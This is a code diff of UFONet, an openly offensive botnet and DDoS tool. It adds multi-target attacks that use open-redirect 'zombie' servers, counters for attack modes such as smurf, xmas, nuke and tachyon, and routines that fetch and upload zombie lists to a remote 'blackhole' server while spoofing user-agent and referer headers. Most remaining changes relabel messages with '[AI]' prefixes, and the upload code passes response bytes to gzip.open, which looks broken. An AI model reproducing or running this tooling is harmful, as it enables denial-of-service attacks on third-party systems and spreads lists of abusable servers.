-                        print "\n[Info] Correctly saved at: 'botnet/humans.txt'\n"
+                        print "\n[Info] [AI] Correctly saved at: 'botnet/humans.txt'\n"
                     print '-'*25 + "\n"
                 if new_zombies and new_zombies > 0:
                     if not self.options.forceyes:
-                        check_url_link_reply = raw_input("Want to check if NEW possible zombies are valid? (Y/n)\n")
+                        check_url_link_reply = raw_input("[AI] Do you want to check if NEW possible zombies are valid? (Y/n)\n")
                         print '-'*25 + "\n"
                     else:
                         check_url_link_reply = "Y"
                     if check_url_link_reply == "n" or check_url_link_reply == "N":
-                        print "Bye!\n"
+                        print "[AI] "+self.exit_msg+"\n"
                         pass
                     else:
                         print "\n" + '='*44
                         test = self.testing(all_zombies_found)
                 else:
-                    print "[Info] NOT any NEW possible zombies found... Exiting!\n"
+                    print "[Info] [AI] NOT any NEW possible zombies found! -> [Exiting!]\n"
             except Exception:
-                print ("[Error] - Something wrong (auto)searching...\n")
+                print ("[Error] [AI] Something wrong (auto)searching...\n")
 
         # test web 'zombie' servers -> show statistics
         if options.test: 
@@ -769,8 +950,9 @@ class UFONet(object):
                 test = self.testing(zombies)
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
-                print ("\n[Error] - Something wrong testing!\n")
-                traceback.print_exc()
+                print ("\n[Error] [AI] Something wrong testing!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
 
         # test XML-'rpc' pingback vulnerable servers -> update list
         if options.testrpc:
@@ -782,8 +964,9 @@ class UFONet(object):
                 testrpc = self.testing_rpcs(rpcs)
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
-                print ("\n[Error] - Something wrong testing XML-RPC servers!\n")
-                traceback.print_exc()
+                print ("\n[Error] [AI] Something wrong testing X-RPCs!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
 
         # check botnet searching for zombies offline
         if options.testoffline:
@@ -792,8 +975,9 @@ class UFONet(object):
                 testbotnet = self.testing_offline()
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
-                print ("\n[Error] - Something wrong checking for offline 'zombies'!\n")
-                traceback.print_exc()
+                print ("\n[Error] [AI] Something wrong checking for offline [Zombies]!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
 
         # check ALL botnet status
         if options.testall:
@@ -802,48 +986,93 @@ class UFONet(object):
                 test_all_botnet = self.testing_all()
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
-                print ("\n[Error] - Something wrong testing ALL botnet status!\n")
-                traceback.print_exc()
+                print ("\n[Error] [AI] Something wrong testing ALL botnet status!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
 
-        # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a target
+        # attack target -> exploit Open Redirect massively and conduct vulnerable servers to a single target
         if options.target:
             try:
                 self.banner()
                 zombies = self.extract_zombies()
                 if not zombies:
                     return
-                attack = self.attacking(zombies)
+                attack = self.attacking(zombies, options.target)
                 self.update_missions_stats() # update mothership missions stats
             except Exception:
-                print ("\n[Error] - Something wrong attacking!\n")
-                traceback.print_exc()
+                print ("\n[Error] [AI] Something wrong attacking!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
+
+        # attack a list of targets -> exploit Open Redirect massively and conduct vulnerable servers to multiple targets
+        if options.target_list:
+            try:
+                self.banner()
+                zombies = self.extract_zombies()
+                if not zombies:
+                    return
+                targets = self.extract_target_list()
+                if not targets:
+                    print "\n[Error] [AI] You haven't any valid [Target] to be extracted from: "+str(options.target_list)+" -> [Exiting!]\n"
+                    return
+                self.options.forceyes = True # force-yes ON!
+                self.num_target_list = 0
+                print "\n[AI] Checking integrity of targets...\n"
+                for t in targets: # start of code block dedicated to: Guido van Rossum [23/12/2018]
+                    if not t.startswith("http"): # discarded inmediately
+                        print "[Info] [AI] [Control] " + str(t) + " -> [Discarding!]"
+                        targets.remove(t) # ¿remove? invalid targets
+                print ""
+                c = 0
+                for target in targets:
+                    if target == "":
+                        c = c + 1
+                    else:
+                        self.num_target_list = self.num_target_list + 1
+                if c == len(targets):
+                    print "\n[Error] [AI] You haven't any valid [Target] to be extracted from: "+str(options.target_list)+" -> [Exiting!]\n"
+                    return # end of code block dedicated to: Guido van Rossum [23/12/2018]
+                else:
+                    for target in targets:
+                        print '='*55 + "\n"
+                        print "[Info] [AI] Aiming: " + str(target) + " -> [OK!]\n"
+                        print "="*55
+                        self.options.target = target
+                        attack = self.attacking(zombies, target)
+                        self.update_missions_stats() # update mothership missions stats (each target counts)
+            except Exception:
+                print ("\n[Error] [AI] Something wrong attacking to multiple targets!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
 
         # inspect target -> inspect target's components sizes
         if options.inspect:
             try:
                 self.banner()
-                print("\nInspecting target to find the best place to attack... SSssh!\n")
+                print("\n[AI] Inspecting target to find the best place to attack... SSssh!\n")
                 print '='*22 + '\n'
                 self.instance = Inspector(self) # instance main class for inspection operations
                 inspection = self.instance.inspecting(options.inspect)
                 self.update_missions_stats() # update mothership missions stats
             except Exception, e:
-                traceback.print_exc()
-                print ("\n[Error] - Something wrong inspecting... Not any object found!\n")
+                print ("\n[Error] [AI] Something wrong inspecting... Not any object found!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
                 return #sys.exit(2)
 
         # abduct target -> examine target's webserver configuration (banner grabbing, anti-ddos, etc.)
         if options.abduction:
             try:
                 self.banner()
-                print("\nAbducting target to extract interesting information... Be patient!\n")
+                print("\n[AI] Abducting target to extract interesting information... Be patient!\n")
                 print '='*22 + '\n'
                 self.instance = Abductor(self) # instance main class for abduction operations
                 abduction = self.instance.abducting(options.abduction)
                 self.update_missions_stats() # update mothership missions stats
             except Exception, e:
-                traceback.print_exc()
-                print ("\n[Error] - Something wrong abducting... Not any data stream found!\n")
+                print ("\n[Error] [AI] Something wrong abducting... Not any data stream found!\n")
+                if self.options.verbose:
+                    traceback.print_exc()
                 return #sys.exit(2)
 
         # attack me -> exploit Open Redirect massively and connect all vulnerable servers to master for benchmarking
@@ -851,22 +1080,22 @@ class UFONet(object):
             self.mothership_id = self.mothership_id[:25] # truncating anti-formats ;-)
             try:
                 self.banner()
-                print("\nOrdering 'zombies' to attack you for benchmarking ;-)\n")
-                print("[Warning] You are going to reveal your real IP to your zombies...\n")
+                print("\n[AI] Ordering [Zombies] to attack you for benchmarking ;-)\n")
+                print("[Warning] You are going to reveal your real IP to [Zombies]!\n")
                 if not self.options.forceyes:
-                    update_reply = raw_input("Want to continue? (Y/n)")
+                    update_reply = raw_input("[AI] Do you want to continue? (Y/n)")
                 else:
                     update_reply = "Y"
                 if update_reply == "n" or update_reply == "N":
-                    print "\n[Info] Aborting 'Attack-Me' test... Bye!\n"
+                    print "\n[Info] [AI] [Control] Aborting 'Attack-Me' test... -> [Exiting!]\n"
                     return
                 self.mothership_hash = str(random.getrandbits(128)) # generating random evasion hash  
                 print "\nMothership ID: " + self.mothership_id + "RND: " + self.mothership_hash
+                print("\n[AI] Checking NAT/IP configuration:\n")
+                nat = self.check_nat()
                 f = open("alien", "w") # generate random alien worker
                 f.write(str(self.mothership_hash))
                 f.close()
-                print("\nChecking NAT/IP configuration:\n")
-                nat = self.check_nat()
                 if self.nat_error_flag == "ON":
                     return
                 zombies = self.extract_zombies()
@@ -875,92 +1104,87 @@ class UFONet(object):
                 attackme = self.attackme(zombies)
                 self.update_missions_stats() # update mothership missions stats
             except Exception, e:
-                traceback.print_exc()
-                print ("\n[Error] - Something wrong redirecting 'zombies' against you...\n")
+                print ("\n[Error] [AI] Something wrong redirecting [Zombies] against you...\n")
+                if self.options.verbose:
+                    traceback.print_exc()
                 return #sys.exit(2)
-
-#        # crawl target -> crawl target's places
-#        if options.crawl:
-#            try:
-#                self.banner()
-#                print("\nCrawlering target's links to discover web structure...\n")
-#                print '='*22 + '\n'
-#                crawler = self.crawlering()
-#            except Exception, e:
-#                print ("[Error] - Something wrong crawlering!\n")
-#                return #sys.exit(2)
 
         # check/update for latest stable version
         if options.update:
             self.banner()
             try:
-                print("\nTrying to update automatically to the latest stable version\n")
+                print("\n[AI] Trying to update automatically to the latest stable version\n")
                 Updater() 
             except:
-                print("\nSomething was wrong!. To have working this feature, you should clone UFONet with:\n")
-                print("$ git clone https://github.com/epsylon/ufonet\n")
+                print "Not any .git repository found!\n"
+                print "="*30
+                print "\nTo have working this feature, you should clone UFONet with:\n"
+                print "$ git clone %s" % self.GIT_REPOSITORY
+                print "\nAlso you can try this other mirror:\n"
+                print "$ git clone %s" % self.GIT_REPOSITORY2 + "\n"
 
         # launch GUI/Web interface
         if options.web:
             self.create_web_interface()
             return
 
-        # generate 'blackhole' server to share 'zombies'
+        # generate [Blackhole] server to share [Zombies]
         if options.blackhole is not None:
             self.banner()
             try:
-                blackhole_lib = os.path.abspath(os.path.join('..', 'server')) # add 'blackhole' lib
+                blackhole_lib = os.path.abspath(os.path.join('..', 'server')) # add [Blackhole] lib
                 sys.path.append(blackhole_lib)
                 from server.blackhole import BlackHole
-                print("\nInitiating void generation sequence...\n")
+                print("\n[AI] Initiating void generation sequence...\n")
                 print '='*22 + '\n'
                 app = BlackHole()
                 app.start()
                 while True: time.sleep(1)
             except KeyboardInterrupt:
-                print("\nTerminating void generation sequence...\n")
+                print("\n[AI] Terminating void generation sequence...\n")
                 app.collapse()
             except Exception, e:
                 print "[Error] "+str(e) 
-                print("\nSomething was wrong generating 'blackhole'. Aborting...\n")
+                print("\n[AI] Something was wrong generating [Blackhole]. Aborting...\n")
 
-        # download list of 'zombies' from a 'blackhole' IP
+        # download list of [Zombies] from a [Blackhole] IP
         if options.dip is not None:
             options.download = True
             self.blackhole = options.dip
 
-        # download list of 'zombies' from server
+        # download list of [Zombies] from server
         if options.download:
             try:
                 self.banner()
                 if options.dip is not None:
-                    print("\nDownloading list of 'zombies' from server "+self.blackhole+" ...\n")
+                    print("\n[AI] Downloading list of [Zombies] from server "+self.blackhole+" ...\n")
                 else:
-                    print("\nDownloading list of 'zombies' from server ...\n")
+                    print("\n[AI] Downloading list of [Zombies] from server ...\n")
                 print '='*22 + '\n'
                 download_list = self.downloading_list()
             except Exception, e:
-                print ("[Error] - Something wrong downloading!\n")
-                return #sys.exit(2)
+                print ("\n[Error] [AI] Something wrong downloading! -> [Exiting!]\n")
+                return
 
-        # upload list of 'zombies' to a 'blackhole' IP
+        # upload list of [Zombies] to a [Blackhole] IP
         if options.upip is not None:
             options.upload = True
             self.blackhole = options.upip
             
-        # upload list of 'zombies' to server
+        # upload list of [Zombies] to server
         if options.upload:
             try:
                 self.banner()
                 if options.upip is not None:
-                    print("\nUploading list of 'zombies' to server "+self.blackhole+" ...\n")
+                    print("\n[AI] Uploading list of [Zombies] to server "+self.blackhole+" ...\n")
                 else:
-                    print("\nUploading list of 'zombies' to server ...\n")
+                    print("\n[AI] Uploading list of [Zombies] to server ...\n")
                 print '='*22 + '\n'
                 upload_list = self.uploading_list()
             except Exception, e:
-                print ("[Error] - Something wrong uploading!\n"+str(e))
-		traceback.print_exc()
+                print ("[Error] [AI] Something wrong uploading! "+str(e)+" -> [Exiting!]\n")
+                if self.options.verbose:
+                    traceback.print_exc()
                 return #sys.exit(2)
 
     # starting new zombie thread
@@ -1001,6 +1225,8 @@ class UFONet(object):
         for zombie in self.zombies:
             t = urlparse(zombie)
             name_zombie = t.netloc
+            if name_zombie == "":
+                name_zombie = zombie
             self.list_zombies.append(name_zombie)
         self.num_zombies = str(len(self.zombies))
         f.close()
@@ -1011,6 +1237,8 @@ class UFONet(object):
         for alien in self.aliens:
             t = urlparse(alien)
             name_alien = t.netloc
+            if name_alien == "":
+                name_alien = alien
             self.list_aliens.append(name_alien)
         self.num_aliens = str(len(self.aliens))
         f.close()
@@ -1021,6 +1249,8 @@ class UFONet(object):
         for droid in self.droids:
             t = urlparse(droid)
             name_droid = t.netloc
+            if name_droid == "":
+                name_droid = droid
             self.list_droids.append(name_droid)
         self.num_droids = str(len(self.droids))
         f.close()
@@ -1031,6 +1261,8 @@ class UFONet(object):
         for ucav in self.ucavs:
             t = urlparse(ucav)
             name_ucav = t.netloc
+            if name_ucav == "":
+                name_ucav = ucav
             self.list_ucavs.append(name_ucav)
         self.num_ucavs = str(len(self.ucavs))
         f.close()
@@ -1041,6 +1273,8 @@ class UFONet(object):
         for rpc in self.rpcs:
             t = urlparse(rpc)
             name_rpc = t.netloc
+            if name_rpc == "":
+                name_rpc = rpc
             self.list_rpcs.append(name_rpc)
         self.num_rpcs = str(len(self.rpcs))
         f.close()
@@ -1050,7 +1284,7 @@ class UFONet(object):
     def update_flying_stats(self):
         if not os.path.exists(self.mothership_stats_file) == True: # create data when no stats file (first time used)
             with open(self.mothership_stats_file, "w") as f:
-                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "crashed": "0"}, f, indent=4) # starting reset
+                json.dump({"flying": "0", "missions": "0", "scanner": "0", "transferred": "0", "max_chargo": "0", "completed": "0", "loic": "0", "loris": "0", "ufosyn": "0", "spray": "0", "smurf": "0", "xmas": "0", "nuke": "0", "tachyon": "0", "crashed": "0"}, f, indent=4) # starting reset
         stats_json_file = open(self.mothership_stats_file, "r")
         data = json.load(stats_json_file)
         stats_json_file.close()
@@ -1166,39 +1400,113 @@ class UFONet(object):
         stats_json_file.write(json.dumps(data))
         stats_json_file.close()
 
+    def update_spray_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        aspray = data["spray"]
+        aspray = str(int(aspray) + 1) # add new spray attack to recorded stats
+        self.total_spray = self.total_spray + 1 # add new spray attack to session stats
+        data["spray"] = aspray
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_smurf_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        asmurf = data["smurf"]
+        asmurf = str(int(asmurf) + 1) # add new smurf attack to recorded stats
+        self.total_smurf = self.total_smurf + 1 # add new smurf attack to session stats
+        data["smurf"] = asmurf
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_xmas_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        axmas = data["xmas"]
+        axmas = str(int(axmas) + 1) # add new xmas attack to recorded stats
+        self.total_xmas = self.total_xmas + 1 # add new xmas attack to session stats
+        data["xmas"] = axmas
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_nuke_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        anuke = data["nuke"]
+        anuke = str(int(anuke) + 1) # add new nuke attack to recorded stats
+        self.total_nuke = self.total_nuke + 1 # add new nuke attack to session stats
+        data["nuke"] = anuke
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
+    def update_tachyon_stats(self):
+        stats_json_file = open(self.mothership_stats_file, "r")
+        data = json.load(stats_json_file)
+        stats_json_file.close()
+        atachyon = data["tachyon"]
+        atachyon = str(int(atachyon) + 1) # add new tachyon attack to recorded stats
+        self.total_tachyon = self.total_tachyon + 1 # add new tachyon attack to session stats
+        data["tachyon"] = atachyon
+        stats_json_file = open(self.mothership_stats_file, "w+")
+        stats_json_file.write(json.dumps(data))
+        stats_json_file.close()
+
     def uploading_list(self): 
-        import gzip
+        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         abductions = "abductions.txt.gz"
         troops = "troops.txt.gz"
         robots = "robots.txt.gz"
         drones = "drones.txt.gz"
         reflectors = "reflectors.txt.gz"
+        if self.options.timeout: # set timeout
+            try:
+                timeout = int(self.options.timeout)
+            except:
+                timeout = 1 
+        else:
+            timeout = 1 
+        if timeout < 1:
+            timeout = 1 
         try:
-            print("Checking integrity of 'blackhole'...\n")
+            print("[AI] Checking integrity of [Blackhole]...\n")
             if self.options.forcessl:
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                        abductions)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
-                        troops)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/robots.txt.gz',
-                        robots)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/drones.txt.gz',
-                        drones)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                        reflectors)
+                if self.options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+		req = urllib2.Request('https://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
+                abductions_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
+                troops_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
+                robots_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
+                drones_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('https://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
+                reflectors_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
             else:
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                        abductions)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/troops.txt.gz',
-                        troops)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/robots.txt.gz',
-                        robots)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/drones.txt.gz',
-                        drones)
-                urllib.urlretrieve('http://'+self.blackhole+'/ufonet/reflectors.txt.gz',
-                        reflectors)
-            print("Vortex: IS READY!")
-            f_in_abductions = gzip.open(abductions, 'rb')
+                if self.options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/abductions.txt.gz', None, headers)
+                abductions_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/troops.txt.gz', None, headers)
+                troops_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/robots.txt.gz', None, headers)
+                robots_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/drones.txt.gz', None, headers)
+                drones_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+                req = urllib2.Request('http://'+self.blackhole+'/ufonet/reflectors.txt.gz', None, headers)
+                reflectors_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+            print("[AI] [Control] [Blackhole] Reply: [VORTEX READY!] ;-)")
+            f_in_abductions = gzip.open(abductions_reply, 'rb')
             f_out_abductions = open('abductions.txt', 'wb')
             f_out_abductions.write(f_in_abductions.read())
             f_in_abductions.close()
@@ -1208,8 +1516,8 @@ class UFONet(object):
             with open('abductions.txt') as f:
                 for _ in f:
                     num_zombies = num_zombies + 1
-            print("\n[Info] - 'Zombies' on 'blackhole': "+ str(num_zombies))
-            f_in_robots = gzip.open(robots, 'rb')
+            print("\n[Info] [Zombies] on [Blackhole]: "+ str(num_zombies))
+            f_in_robots = gzip.open(robots_reply, 'rb')
             f_out_robots = open('robots.txt', 'wb')
             f_out_robots.write(f_in_robots.read())
             f_in_robots.close()
@@ -1219,8 +1527,8 @@ class UFONet(object):
             with open('robots.txt') as f:
                 for _ in f:
                     num_robots = num_robots + 1
-            print("[Info] - 'Droids' on 'blackhole' : "+ str(num_robots))
-            f_in_troops = gzip.open(troops, 'rb')
+            print("[Info] [Droids] on [Blackhole] : "+ str(num_robots))
+            f_in_troops = gzip.open(troops_reply, 'rb')
             f_out_troops = open('troops.txt', 'wb')
             f_out_troops.write(f_in_troops.read())
             f_in_troops.close()
@@ -1230,8 +1538,8 @@ class UFONet(object):
             with open(self.aliens_file) as f:
                 for _ in f:
                     num_aliens = num_aliens + 1
-            print("[Info] - 'Aliens' on 'blackhole' : "+ str(num_aliens))
-            f_in_drones = gzip.open(drones, 'rb')
+            print("[Info] [Aliens] on [Blackhole] : "+ str(num_aliens))
+            f_in_drones = gzip.open(drones_reply, 'rb')
             f_out_drones = open('drones.txt', 'wb')
             f_out_drones.write(f_in_drones.read())
             f_in_drones.close()
@@ -1241,8 +1549,8 @@ class UFONet(object):
             with open('drones.txt') as f:
                 for _ in f:
                     num_drones = num_drones + 1
-            print("[Info] - 'Drones' on 'blackhole' : "+ str(num_drones))
-            f_in_reflectors = gzip.open(reflectors, 'rb')
+            print("[Info] [Drones] on [Blackhole] : "+ str(num_drones))
+            f_in_reflectors = gzip.open(reflectors_reply, 'rb')
             f_out_reflectors = open('reflectors.txt', 'wb')
             f_out_reflectors.write(f_in_reflectors.read())
             f_in_reflectors.close()
@@ -1252,10 +1560,10 @@ class UFONet(object):
             with open('reflectors.txt') as f:
                 for _ in f:
                     num_reflectors = num_reflectors + 1
-            print("[Info] - 'X-RPCs' on 'blackhole' : "+ str(num_reflectors))
+            print("[Info] [X-RPCs] on [Blackhole] : "+ str(num_reflectors))
             print '-'*12 + '\n'
             if not self.options.forceyes:
-                update_reply = raw_input("Want to merge ONLY new 'zombies' into the server? (Y/n)")
+                update_reply = raw_input("[AI] Do you want to merge ONLY the new [Zombies] into [Blackhole]? (Y/n)")
                 print '-'*25
             else:
                 update_reply = "Y"
@@ -1265,10 +1573,10 @@ class UFONet(object):
                 os.remove('robots.txt') # remove robots file
                 os.remove('drones.txt') # remove drones file
                 os.remove('reflectors.txt') # remove reflectors file
-                print "\n[Info] - Aborting upload process and cleaning temporal files. Bye!\n"
+                print "\n[Info] [AI] [Control] Aborting upload process and cleaning temporal files... -> [Exiting!]\n"
                 return
             else:
-                print "\n[Info] - Checking integrity of your list of 'zombies'. Starting test!\n" # only upload valid zombies
+                print "\n[AI] Checking integrity of your list of [Zombies] -> [OK!]\n" # only upload valid zombies
                 print '='*35
                 zombies = self.extract_zombies()
                 if not zombies:
@@ -1290,7 +1598,7 @@ class UFONet(object):
                         zombies_added = zombies_added + 1
                     else:
                         pass
-                print("[Info] - New 'zombies' found: " + str(zombies_added))
+                print("[Info] [AI] New [Zombies] found: " + str(zombies_added))
                 aliens = self.extract_aliens()
                 if not aliens:
                     return
@@ -1310,7 +1618,7 @@ class UFONet(object):
                         aliens_added = aliens_added + 1
                     else:
                         pass
-                print("[Info] - New 'aliens' found : " + str(aliens_added))
+                print("[Info] [AI] New [Aliens] found : " + str(aliens_added))
                 droids = self.extract_droids()
                 if not droids:
                     return
@@ -1330,7 +1638,7 @@ class UFONet(object):
                         droids_added = droids_added + 1
                     else:
                         pass
-                print("[Info] - New 'droids' found : " + str(droids_added))
+                print("[Info] [AI] New [Droids] found : " + str(droids_added))
                 ucavs = self.extract_ucavs()
                 if not ucavs:
                     return
@@ -1350,7 +1658,7 @@ class UFONet(object):
                         ucavs_added = ucavs_added + 1
                     else:
                         pass
-                print("[Info] - New 'drones' found : " + str(ucavs_added))
+                print("[Info] [AI] New [UCAVs] found : " + str(ucavs_added))
                 rpcs = self.extract_rpcs()
                 if not ucavs:
                     return
@@ -1370,15 +1678,15 @@ class UFONet(object):
                         rpcs_added = rpcs_added + 1
                     else:
                         pass
-                print("[Info] - New 'X-RPCs' found : " + str(rpcs_added))
+                print("[Info] [AI] New [X-RPCs] found : " + str(rpcs_added))
                 print '-'*12 + '\n'
-                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0: # not zombies of any type
+                if zombies_added == 0 and aliens_added == 0 and droids_added == 0 and ucavs_added == 0 and rpcs_added == 0: # not any zombie
                     os.remove('abductions.txt') # remove abductions file
                     os.remove('troops.txt') # remove troops file
                     os.remove('robots.txt') # remove robots file
                     os.remove('drones.txt') # remove ucavs file
                     os.remove('rpcs.txt') # remove rpcs file
-                    print("[Info] - Hehehe.. You should try to search for new 'zombies'. These are already in this 'blackhole'. ;-)\n")
+                    print("[Info] [AI] Try to search for new [Zombies]. These are already in this [Blackhole] -> [Exiting!]\n")
                     return
                 else:
                     fc = gzip.open('community_zombies.txt.gz', 'wb')
@@ -1406,13 +1714,13 @@ class UFONet(object):
                         fc.write(rpc.strip()+"\n")
                     fc.close()
                     os.remove('reflectors.txt') # remove reflectors file
-                    print("[Info] - Starting to upload new 'zombies'...\n")
-                    try: # open a socket and send data to ufonet_community reciever
+                    print("[Info] [AI] Starting to upload new [Zombies]...\n")
+                    try: # open a socket and send data to the blackhole reciever port
                         host = self.blackhole 
                         cport = 9991
                         mport = 9990
                         try:
-                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data one by one recieved by multithreading
+                            cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # send data
                             cs.connect((host, cport))
                             cs.send("SEND " + 'community_zombies.txt.gz')
                             cs.close()
@@ -1478,116 +1786,208 @@ class UFONet(object):
                             os.remove('community_rpcs.txt.gz') # remove local rpcs .gz file after transfer
                             time.sleep(2) # sleep a bit more
                             print '-'*12 + '\n'
-                            print("[Info] - Transfer: DONE!. Thanks for your contribution ;-)\n")
+                            print("[Info] [AI] Transfer -> [DONE!]\n")
                         except Exception, e:
                             print str(e) + "\n"
                     except:
                         print '-'*12 + '\n'
-                        print("[Error] - Connecting sockets to 'blackhole'. Aborting!\n")
+                        print("[Error] [AI] Connecting sockets to [Blackhole] -> [Aborting!]\n")
                         return
         except:
             print '-'*12 + '\n'
-            print("[Error] - Unable to upload list of 'zombies' to this 'blackhole'. ;(\n")
-            return #sys.exit(2)
+            print("[Error] [AI] Unable to upload list of [Zombies] to this [Blackhole] -> [Exiting!]\n")
+            return
 
-    def downloading_list(self): # add your mirror to protect/share/distribute zombies
-        import urllib, gzip
-        abductions = "abductions.txt.gz"
-        troops = "troops.txt.gz"
-        robots = "robots.txt.gz"
-        drones = "drones.txt.gz"
-        reflectors = "reflectors.txt.gz"
+    def update_gui_data(self):
+    # download all GUI stream data
+        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+        if self.options.proxy: # set proxy
+            self.proxy_transport(self.options.proxy)
+        if self.options.timeout: # set timeout
+            try:
+                timeout = int(self.options.timeout)
+            except:
+                timeout = 1 
+        else:
+            timeout = 1 
+        if timeout < 1:
+            timeout = 1 
+        if self.options.forcessl:
+            news = urllib2.Request('https://'+self.blackhole+'/ufonet/news.txt', None, headers) 
+            news_reply = urllib2.urlopen(news, context=self.ctx, timeout=timeout).read()
+            missions = urllib2.Request('https://'+self.blackhole+'/ufonet/missions.txt', None, headers)                         
+            missions_reply = urllib2.urlopen(missions, context=self.ctx, timeout=timeout).read()
+            board = urllib2.Request('https://'+self.blackhole+'/ufonet/board.txt', None, headers)
+            board_reply = urllib2.urlopen(board, context=self.ctx, timeout=timeout).read()
+            grid = urllib2.Request('https://'+self.blackhole+'/ufonet/grid.txt', None, headers)
+            grid_reply = urllib2.urlopen(grid, context=self.ctx, timeout=timeout).read()
+            wargames = urllib2.Request('https://'+self.blackhole+'/ufonet/wargames.txt', None, headers)
+            wargames_reply = urllib2.urlopen(wargames, context=self.ctx, timeout=timeout).read()
+        else:
+            news = urllib2.Request('http://'+self.blackhole+'/ufonet/news.txt', None, headers)
+            news_reply = urllib2.urlopen(news, context=self.ctx).read()
+            missions = urllib2.Request('http://'+self.blackhole+'/ufonet/missions.txt', None, headers)
+            missions_reply = urllib2.urlopen(missions, context=self.ctx).read()
+            board = urllib2.Request('http://'+self.blackhole+'/ufonet/board.txt', None, headers)
+            board_reply = urllib2.urlopen(board, context=self.ctx).read()
+            grid = urllib2.Request('http://'+self.blackhole+'/ufonet/grid.txt', None, headers)
+            grid_reply = urllib2.urlopen(grid, context=self.ctx).read()
+            wargames = urllib2.Request('http://'+self.blackhole+'/ufonet/wargames.txt', None, headers)
+            wargames_reply = urllib2.urlopen(wargames, context=self.ctx).read()
+        f = open(self.news_file, 'w')
+        f.write(news_reply)
+        f.close()
+        f = open(self.missions_file, 'w')
+        f.write(missions_reply)
+        f.close()
+        f = open(self.board_file, 'w')
+        f.write(board_reply)
+        f.close()
+        f = open(self.grid_file, 'w')
+        f.write(grid_reply)
+        f.close()
+        f = open(self.wargames_file, 'w')
+        f.write(wargames_reply)
+        f.close()
+        print '-'*25 + "\n"
+        print "[Info] [AI] GUI data correctly updated:\n"
+        if news_reply:
+            print "[Info] [AI] [News]    : OK!"
+        if missions_reply:
+            print "[Info] [AI] [Missions]: OK!"
+        if board_reply:
+            print "[Info] [AI] [Board]   : OK!"
+        if grid_reply:
+            print "[Info] [AI] [Grid]    : OK!"
+        if wargames_reply:
+            print "[Info] [AI] [Wargames]: OK!"
+        print '-'*25
+        print "\n[AI] "+self.exit_msg+"\n"
+
+    def downloading_list(self): 
+        # add your mirror to protect/share/distribute zombies
         try:
-            print("Trying 'blackhole': "+self.blackhole+"\n")
-            if self.options.forcessl:
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/abductions.txt.gz',
-                       abductions)
-                urllib.urlretrieve('https://'+self.blackhole+'/ufonet/troops.txt.gz',
-                       troops)
